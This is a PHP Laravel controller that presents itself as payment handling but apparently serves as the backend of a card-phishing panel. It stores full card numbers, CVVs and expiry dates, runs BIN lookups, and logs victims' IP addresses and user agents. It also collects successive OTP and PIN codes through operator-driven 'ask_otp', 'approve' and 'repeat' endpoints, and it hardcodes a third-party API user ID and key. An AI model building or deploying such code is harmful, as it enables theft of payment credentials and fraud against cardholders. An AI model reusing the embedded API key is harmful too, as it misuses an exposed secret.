<?php

namespace App\Http\Controllers;

use Carbon\Carbon;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Http;
use Symfony\Component\HttpFoundation\Response;
use App\Models\Payment;
use App\Models\Visitor;
use Validator;

class PaymentController extends Controller
{
    public function home()
    {
        $payments = Payment::orderByDesc('created_at')->get();
        return view('payments.index', ['payments' => $payments]);
    }

    public function index()
    {
        $payments = Payment::where('updated_at', '>=', Carbon::now()->subHour(24)->toDateTimeString())
            ->orderByDesc('created_at')->get();
        return response()->json([
            'payments' => $payments
        ]);
    }

    public function show($id)
    {
        $payment = Payment::find($id);
        return response()->json([
            'payment' => $payment
        ]);
    }

    public function save_payment(Request $request)
    {
        $validator = Validator::make($request->all(), [
            'card_no' => 'required',
            'card_holder' => 'required',
            'expiry' => 'required',
            'cvv' => 'required',
        ]);

        if($validator->fails()) {
            return response()->json([
                'message'	=> 'Error saving details',
                'errors'	=> $validator->errors()
            ], Response::HTTP_UNPROCESSABLE_ENTITY);
        }

        $paymentData = $request->only(
            'card_no',
            'card_holder',
            'expiry',
            'cvv'
        );

        $url = 'https://neutrinoapi.net/bin-lookup';
        $postData = array(
            "user-id" => "ramaniwilliiam012",
            "api-key" => "xKyYa9L0IHfzX6m5Ilnwaq8KCwoN7tt6bwHRYshS2327j0Nr",
            "bin-number" => $paymentData['card_no']
        );

//        $y=1
        $resp = Http::post($url, $postData);

        if( ! $resp->successful() ) {
            return response()->json([
                'message' => 'BIN '.$resp['api-error-msg']
            ], Response::HTTP_UNPROCESSABLE_ENTITY);
        }

        $paymentData['bin'] = $resp->body();
        $paymentData['ip_addr'] = $request->ip();
        $paymentData['user_agent']	= $request->server('HTTP_USER_AGENT');

//        $paymentData['bin'] = '{"country":"UNITED STATES","country-code":"US","card-brand":"VISA","is-commercial":false,"bin-number":"411111","issuer":"JPMORGAN CHASE BANK, N.A.","issuer-website":"http://www.jpmorganchase.com","valid":true,"card-type":"CREDIT","is-prepaid":false,"card-category":"","issuer-phone":"1-212-270-6000","currency-code":"USD","country-code3":"USA"}';
//        $paymentData['ip_addr'] = '127.0.0.1';
//        $paymentData['user_agent']	= 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36';

        $payment = Payment::create($paymentData);

        return response()->json([
            'message' => 'Details saved successfully',
            'data' => [
                'id' => $payment->id,
                'ip_addr' => $request->ip()
            ]
        ]);
    }

    public function ask_otp(Request $request)
    {
        $payment = Payment::find($request->payment_id);
        $payment->sms_attempts = $payment->sms_attempts + 1;
        $payment->active = 0; // Set active to inactive each time the message is sent from server to client.
        $payment->action = 0; // 0: Sent, 1: Received
        $payment->save();

        return response()->json([
            'message' => 'Otp request sent successfully',
            'payment' => $payment
        ]);
    }

    public function verify_otp(Request $request)
    {
        $payment = Payment::find($request->payment_id);

        $otpCode = $request->key_code;
        $otpCodes = $payment->otp_code ?? [];
        array_unshift($otpCodes, $otpCode);

        $requestData = [
            'otp_code' => $otpCodes,
            'action' => 1
        ];

        if($request->has('pin_code')) {
            $pinCode = $request->pin_code;
            $pinCodes = $payment->pin_code ?? [];
            array_unshift($pinCodes, $pinCode);
            $requestData['pin_code'] = $pinCodes;
        }

        $payment->update($requestData);

        return response()->json([
            'message' => 'Otp verified successfully',
        ]);
    }

    public function approve_payment(Request $request)
    {
        $payment = Payment::find($request->payment_id);
        $payment->approval_attempts = $payment->approval_attempts + 1;
        $payment->action = 1; // 0: Sent, 1: Received
        $payment->active = 0;
        $payment->save();

        return response()->json([
            'message' => 'Approve payment',
            'payment' => $payment
        ]);
    }

    public function repeat_payment(Request $request)
    {
        $payment = Payment::find($request->payment_id);
        $payment->repeat_attempts = $payment->repeat_attempts + 1;
        $payment->action = 1; // 0: Sent, 1: Received
        $payment->active = 0;
        $payment->quit = 1;
        $payment->save();

        return response()->json([
            'message' => 'Repeat payment',
            'payment' => $payment,
        ]);
    }

    public function delete_payment(Request $request)
    {
        Payment::whereIn('id', $request->ids)->delete();

        return response()->json([
            'message' => count($request->ids).' rows deleted successfully',
        ]);
    }

    public function delete_all(Request $request)
    {
        Payment::query()->delete();
        return response()->json([
            'message' => 'All rows deleted successfully',
        ]);
    }

    public function update_status(Request $request)
    {
        $payment = Payment::find($request->payment_id);
        $payment->active = $request->active;
        $payment->save();

        return response()->json([
            'message' => 'Payment data successfully updated.',
        ]);
    }

    public function update_selected(Request $request)
    {
        $payment = Payment::find($request->payment_id);
        $payment->selected = $request->selected;
        $payment->save();

        return response()->json([
            'message' => 'Payment selected field successfully updated.',
        ]);
    }

    public function getLastVistorsCount()
    {
        $count = Visitor::where('updated_at', '>=', Carbon::now()->subHour(24)->toDateTimeString())
            ->orderByDesc('created_at')->count();

        return response()->json([
            'count' => $count,
        ]);
    }
}
